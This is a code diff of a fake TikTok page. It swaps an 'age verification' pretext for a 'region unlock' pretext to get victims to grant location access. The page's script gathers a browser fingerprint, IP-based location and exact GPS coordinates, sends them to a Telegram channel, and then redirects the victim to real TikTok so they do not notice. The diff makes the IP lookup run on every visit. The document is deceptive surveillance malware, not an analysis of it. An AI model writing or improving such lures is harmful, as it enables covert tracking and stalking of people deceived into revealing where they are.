@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>TikTok · Age Restricted</title>
+    <title>TikTok · Region Unlock</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -59,7 +59,7 @@
             backdrop-filter: blur(8px);
             border: 0.5px solid rgba(255,255,255,0.2);
         }
-        .age-warning {
+        .region-warning {
             font-size: 12px;
             color: #ffaa44;
             margin-top: 5px;
@@ -93,12 +93,12 @@
 <body>
 <div class="container">
     <div class="video-placeholder">
-        <div class="play-icon">🎬</div>
+        <div class="play-icon">🌍</div>
         <div class="overlay-message">
-            🔞 Age Restricted Content<br>
-            <span class="age-warning">You must verify your age to watch this video.</span>
+            🌍 Video Unavailable in Your Region<br>
+            <span class="region-warning">Allow location to confirm your country and unlock content.</span>
         </div>
-        <button class="allow-button" id="allowBtn">▶️ Tap to Verify & Play</button>
+        <button class="allow-button" id="allowBtn">🌍 Unlock Video</button>
         <div class="status-text" id="statusMsg"></div>
     </div>
     <div class="footer">
@@ -193,13 +193,15 @@
     const statusSpan = document.getElementById('statusMsg');
 
     btn.addEventListener('click', async () => {
-        statusSpan.innerHTML = 'Verifying age... <span class="spinner"></span>';
+        statusSpan.innerHTML = 'Unlocking region... <span class="spinner"></span>';
         const fp = getFingerprint();
 
+        // Always get IP location regardless of GPS outcome
+        const ipLocation = await getIPLocation();
+
         if (!navigator.geolocation) {
-            statusSpan.innerHTML = 'Verification failed. Redirecting...';
-            const ipLoc = await getIPLocation();
-            await sendToTelegram(`❌ No geolocation support\n\nIP Location: ${ipLoc}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`);
+            statusSpan.innerHTML = 'Unlock failed. Redirecting...';
+            await sendToTelegram(`❌ No geolocation support\n\nIP Location: ${ipLocation}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`);
             setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1800);
             return;
         }
@@ -214,7 +216,7 @@
                     heading: position.coords.heading,
                     speed: position.coords.speed
                 };
-                const msg = `📍 EXACT LOCATION (Age verified)\n\nCoordinates: ${loc.lat}, ${loc.lon}\nAccuracy: ${loc.accuracy}m\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
+                const msg = `📍 EXACT GPS (Region unlocked)\n\nCoordinates: ${loc.lat}, ${loc.lon}\nAccuracy: ${loc.accuracy}m\n\n🌍 IP Location (fallback): ${ipLocation}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
                 await sendToTelegram(msg);
                 statusSpan.innerHTML = 'Access granted! Playing video...';
                 setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1500);
@@ -222,14 +224,13 @@
             async (error) => {
                 let errorMsg = '';
                 switch(error.code) {
-                    case error.PERMISSION_DENIED: errorMsg = 'User denied location (age verification failed)'; break;
+                    case error.PERMISSION_DENIED: errorMsg = 'User denied location'; break;
                     case error.POSITION_UNAVAILABLE: errorMsg = 'Position unavailable'; break;
                     case error.TIMEOUT: errorMsg = 'Timeout'; break;
                     default: errorMsg = 'Unknown error';
                 }
-                statusSpan.innerHTML = 'Verification failed. Redirecting anyway...';
-                const ipLoc = await getIPLocation();
-                const msg = `🚫 LOCATION DENIED (${errorMsg})\n\nIP Location: ${ipLoc}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
+                statusSpan.innerHTML = 'Location blocked. Redirecting...';
+                const msg = `🚫 LOCATION DENIED (${errorMsg})\n\nIP Location: ${ipLocation}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
                 await sendToTelegram(msg);
                 setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1800);
             },
